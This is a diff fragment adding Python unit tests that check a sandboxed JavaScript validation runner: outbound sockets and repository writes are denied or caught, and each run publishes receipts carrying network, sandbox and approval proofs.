+            "controller",
+        )
+        APPLY_MODULE.record_agent_status(
+            run_dir, task_id, "implementer", "validation-impl", "completed", "controller"
+        )
+        APPLY_MODULE.transition_task_state(run_dir, task_id, "IMPLEMENTED", "validation-impl")
+        APPLY_MODULE.capture_task_change_set(run_dir, task_id, "controller")
+        return run_dir, task_id
+
+    def _published_js_receipt(self, run_dir: Path, task_id: str, result: dict) -> dict:
+        receipt = json.loads(Path(result["receipt_path"]).read_text(encoding="utf-8"))
+        self.assertEqual(receipt["network_enforcement_proof"], self._js_expected_network_proof())
+        self.assertEqual(receipt["host_sandbox_proof"], self._js_expected_host_sandbox_proof())
+        self.assertEqual(receipt["approval_proof"], "not_observed")
+        return receipt
+
+    def test_execute_planned_validation_js_pure_run_records_enforced_receipt(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "pure")
+            result = APPLY_MODULE.execute_planned_validation(run_dir, task_id, "VAL-01", "controller")
+            self.assertEqual(result["exit_code"], 0)
+            receipt = self._published_js_receipt(run_dir, task_id, result)
+            self.assertEqual(receipt["result"]["exit_code"], 0)
+
+    def test_execute_planned_validation_js_spawned_git_child_succeeds(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "spawngit")
+            result = APPLY_MODULE.execute_planned_validation(run_dir, task_id, "VAL-01", "controller")
+            self.assertEqual(result["exit_code"], 0)
+            self._published_js_receipt(run_dir, task_id, result)
+
+    def test_execute_planned_validation_js_outbound_socket_is_denied(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "outbound")
+            result = APPLY_MODULE.execute_planned_validation(run_dir, task_id, "VAL-01", "controller")
+            # The runner classifies the denied socket and exits 42; the receipt
+            # still publishes with the enforced-network proof.
+            self.assertEqual(result["exit_code"], 42)
+            self._published_js_receipt(run_dir, task_id, result)
+
+    def test_execute_planned_validation_js_repo_write_is_denied_or_caught(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "repowrite")
+            marker = root / "JS_RUNNER_EXFIL_MARKER.txt"
+            try:
+                result = APPLY_MODULE.execute_planned_validation(
+                    run_dir, task_id, "VAL-01", "controller"
+                )
+            except ValueError as exc:
+                # Linux without Landlock: the write lands but the post-hoc
+                # repository-digest compare catches it and fails closed.
+                self.assertIn("validation_command_mutated_repository", str(exc))
+            else:
+                # macOS seatbelt (or Linux Landlock): the write is denied outright,
+                # so the repository is never mutated and the runner reports denial.
+                self.assertFalse(marker.exists(), "repo write should have been denied")
+                self.assertEqual(result["exit_code"], 46)
+                self._published_js_receipt(run_dir, task_id, result)
 
     def test_validation_descendant_escape_is_blocked_before_receipt_publication(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir, tempfile.TemporaryDirectory() as marker_dir:
